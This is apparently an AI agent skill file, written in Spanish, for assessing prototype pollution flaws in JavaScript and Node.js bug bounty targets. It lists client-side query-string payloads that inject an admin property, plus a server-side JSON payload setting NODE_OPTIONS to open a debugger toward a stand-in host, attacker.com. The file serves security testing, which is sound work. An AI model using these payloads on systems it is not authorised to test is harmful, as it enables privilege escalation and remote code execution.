---
name: bug-bounty-prototype-pollution
description: Identificación y remediación de vulnerabilidades Prototype Pollution en aplicaciones JavaScript y Node.js. Manipulación de Object.prototype tanto Client-Side como Server-Side.
---

# Skill: Prototype Pollution Assessment

Esta habilidad capacita al agente para evaluar vulnerabilidades donde un atacante puede inyectar o modificar propiedades en `Object.prototype`, afectando a todos los objetos creados posteriormente en la aplicación JavaScript.

## 📌 Diagnóstico y Explotación

### 1. Client-Side Prototype Pollution
- Inyección via URL Query Parameters o JSON payload:
  `?__proto__[admin]=true`
  `?__proto__.admin=true`
  `?constructor.prototype.admin=true`

### 2. Server-Side Prototype Pollution (Node.js)
- Fusión profunda insegura (`lodash.merge`, `defaultsDeep` vulnerables):
  ```json
  {
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--inspect=attacker.com:9229"
    }
  }
  ```

---

## 📚 Referencias Técnicas

Consulta los gadgets y mitigaciones en:
[proto-pollution.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-prototype-pollution/references/proto-pollution.md)
